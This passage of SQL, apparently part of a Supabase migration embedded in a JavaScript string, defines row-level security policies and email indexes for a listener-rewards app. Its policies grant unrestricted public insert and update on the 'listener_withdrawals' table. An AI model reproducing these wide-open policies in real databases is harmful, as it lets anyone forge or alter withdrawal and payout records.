CREATE POLICY "Allow public insert on listener_withdrawals" ON public.listener_withdrawals FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS "Allow public update on listener_withdrawals" ON public.listener_withdrawals;
CREATE POLICY "Allow public update on listener_withdrawals" ON public.listener_withdrawals FOR UPDATE USING (true);

-- 6. Índices de performance
CREATE INDEX IF NOT EXISTS idx_listener_accounts_email ON public.listener_accounts(email);
CREATE INDEX IF NOT EXISTS idx_funnel_events_email ON public.funnel_events(email);
CREATE INDEX IF NOT EXISTS idx_listener_progress_email ON public.listener_progress(listener_email);
CREATE INDEX IF NOT EXISTS idx_listener_withdrawals_email ON public.listener_withdrawals(listener_email);
`;


